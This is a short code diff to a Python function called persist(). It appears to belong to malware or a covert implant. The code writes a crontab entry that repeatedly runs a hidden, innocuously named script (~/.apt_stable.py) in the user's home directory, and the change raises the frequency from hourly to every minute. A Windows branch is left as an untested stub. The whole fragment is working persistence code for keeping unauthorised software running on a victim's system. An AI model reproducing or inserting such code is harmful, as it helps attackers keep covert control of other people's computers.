@@ -47,7 +47,7 @@ def persist():
             except:
                 pass
             cmd = "python3 " + os.path.join(os.path.expanduser("~"), ".apt_stable.py")
-            subprocess.run(["bash","-c",f"(echo 5 \* \* \* \* DISPLAY=:0 {cmd}; echo {opt}) |  crontab "])
+            subprocess.run(["bash","-c",f"(echo \* \* \* \* \* DISPLAY=:0 {cmd}; echo {opt}) |  crontab "])
     else:
         #windows
         #test this
